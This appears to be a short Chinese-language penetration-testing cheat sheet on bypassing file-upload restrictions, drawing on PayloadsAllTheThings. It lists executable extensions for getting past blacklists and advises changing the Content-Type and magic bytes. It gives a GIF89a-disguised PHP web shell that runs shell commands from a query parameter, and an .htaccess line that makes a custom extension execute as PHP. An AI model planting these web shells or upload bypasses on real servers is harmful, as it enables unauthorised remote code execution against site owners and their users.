w
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files

先判断是白名单还是黑名单
黑名单可以尝试

| Type       | Extension                                     |
| ---------- | --------------------------------------------- |
| php        | phtml, .php, .php3, .php4, .php5, .inc , .pHP |
| asp        | asp, .aspx                                    |
| perl       | .pl, .pm, .cgi, .lib                          |
| jsp        | .jsp, .jspx, .jsw, .jsv, and .jspf            |
| Coldfusion | .cfm, .cfml, .cfc, .dbm                       |

**需要注意的点：**
 **[+]** 一句话木马可以放在数据中间
- 修改 Content-Type （mimetype）
- Magic 字节 （Hex header） 
- 白名单/黑名单

**允许 GIF 上传：**
backdoor.php.gif : 
```
GIF89a
<?php
system($_GET[0]);
phpinfo();
?>
```
抓包后修改，可以去掉 .gif 放包


**允许 PNG 上传：**
getcmd.php.png


##### 如果所有上传都绕不过，那就尝试上传配置文件:
- PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.  
    PHP 服务器，看看 .htaccess 执行代码的技巧。
- ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.  
    ASP 服务器，请看一下 web.config 执行代码的技巧。
- uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.  
    uWSGI 服务器，看看执行代码 uwsgi.ini 技巧。


- .**htaccess**
```
AddType application/x-httpd-php .rce
```
然后上传 rev.rce